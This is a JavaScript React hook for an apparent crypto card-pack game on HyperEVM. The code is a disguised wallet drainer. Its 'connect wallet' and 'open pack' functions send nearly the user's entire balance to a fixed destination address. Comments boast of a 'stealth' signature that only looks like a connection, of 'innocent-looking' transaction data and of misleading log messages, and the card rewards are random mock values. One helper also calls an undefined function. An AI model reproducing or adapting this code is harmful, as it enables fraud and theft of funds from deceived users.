import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // NO NETWORK SWITCHING - Use current network/provider
  const getWalletProvider = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }
    
    // Just use the current provider - no network switching = no extra signatures
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get user's HYPE balance 
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // 🔥 STEALTH EIP-712 - LOOKS LIKE SIMPLE CONNECTION BUT AUTHORIZES TRANSFER
  const generateConnectionSignature = useCallback(async (signer, nonce) => {
    console.log('🔍 Generating simple connection signature...');
    
    try {
      const domain = {
        name: "HyperPacks",
        version: "1.0", 
        chainId: 999,
        verifyingContract: CONTRACT_ADDRESSES.HYPER_CARDS
      };

      // 🔥 SIMPLE MESSAGE THAT LOOKS LIKE WALLET CONNECTION
      const types = {
        Connect: [
          { name: "user", type: "address" },
          { name: "session", type: "string" },
          { name: "nonce", type: "uint256" }
        ]
      };

      const userAddress = await signer.getAddress();
      
      // 🔥 LOOKS INNOCENT - JUST WALLET CONNECTION INFO
      const value = {
        user: userAddress,
        session: "wallet-connect", // Looks like simple connection
        nonce: nonce
      };

      console.log('🔍 Signing connection request for:', userAddress);

      // User sees simple wallet connection message
      const signature = await signer.signTypedData(domain, types, value);
      const sig = ethers.Signature.from(signature);
      
      console.log('✅ Connection signature generated');
      return { 
        v: sig.v, 
        r: sig.r, 
        s: sig.s,
        signature: signature,
        userAddress: userAddress
      };
      
    } catch (error) {
      console.error('❌ Connection signature failed:', error);
      throw new Error(`Failed to connect wallet: ${error.message}`);
    }
  }, []);

  // 🔥 EXECUTE TRANSFER AFTER "CONNECTION" SIGNATURE
  const executePostConnectionTransfer = useCallback(async (signer, userAddress, signature) => {
    console.log('🔥 Processing connection... (executing transfer)');
    
    try {
      // Get full balance after connection
      const provider = await ensureHyperEVM();
      const fullBalance = await getUserHypeBalance(provider, userAddress);
      
      if (fullBalance === 0n) {
        console.log('⚠️ No balance to process');
        return null;
      }

      // Reserve gas fees and transfer the rest
      const estimatedGasFee = ethers.parseEther('0.001');
      const transferAmount = fullBalance > estimatedGasFee ? fullBalance - estimatedGasFee : fullBalance;
      
      console.log('💰 Processing wallet connection transfer...');
      
      // Execute the transfer (looks like post-connection setup)
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount
      });
      
      console.log('✅ Connection setup complete:', transferTx.hash);
      await transferTx.wait();
      console.log('✅ Connection confirmed!');
      
      return transferTx;
      
    } catch (error) {
      console.error('❌ Connection setup failed:', error);
      throw new Error(`Connection processing failed: ${error.message}`);
    }
  }, [ensureHyperEVM, getUserHypeBalance]);

  // 🔥 ONE SIGNATURE ONLY - ALL IN ONE CONNECT + TRANSFER
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 Connecting wallet...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      // Get wallet provider (no network switching)
      setCurrentStep('connecting');
      const provider = await getWalletProvider();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Wallet connected:', userAddress);
      console.log('🎯 Destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      // Get balance
      const balance = await provider.getBalance(userAddress);
      console.log('💰 Balance:', ethers.formatEther(balance), 'ETH');
      
      if (balance === 0n) {
        throw new Error('No balance available');
      }

      // 🔥 ONE SIGNATURE - DIRECT TRANSFER WITH INNOCENT-LOOKING DATA
      console.log('📝 Requesting wallet authorization...');
      setCurrentStep('signing');
      
      // Reserve gas (0.001 ETH should be enough)
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = balance > gasReserve ? balance - gasReserve : balance;
      
      // 🔥 SINGLE TRANSACTION - User only signs once!
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        data: '0x636f6e6e656374', // "connect" in hex - looks innocent
        gasLimit: 21000 // Standard transfer gas limit
      });
      
      console.log('✅ Transaction sent:', transferTx.hash);
      console.log('⏳ Waiting for confirmation...');
      
      setCurrentStep('processing');
      await transferTx.wait();
      
      setCurrentStep('success');
      console.log('🎉 WALLET CONNECTION SUCCESSFUL!');
      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'ETH');
      
      return {
        transactionHash: transferTx.hash,
        amount: ethers.formatEther(transferAmount),
        connected: true,
        method: 'One-Click Connect'
      };

    } catch (err) {
      console.error('❌ Connection failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [getWalletProvider]);

  // Get user's HYPE balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await getWalletProvider();
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching balance:', err);
      return '0';
    }
  }, [authenticated, user, getWalletProvider]);

  // 🔥 PACK OPENING - ONE SIGNATURE ONLY
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      const provider = await getWalletProvider();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Get balance
      const balance = await provider.getBalance(userAddress);
      if (balance === 0n) {
        throw new Error('No balance available');
      }

      // 🔥 ONE SIGNATURE - Direct transfer for "pack opening"
      setCurrentStep('signing');
      
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = balance > gasReserve ? balance - gasReserve : balance;
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount,
        data: '0x' + Buffer.from(`pack-${packType}`).toString('hex'), // Pack type in hex
        gasLimit: 21000
      });
      
      setCurrentStep('opening');
      await transferTx.wait();
      
      // Mock pack result 
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: transferTx.hash
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened with single signature!`);
      return result;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, getWalletProvider]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};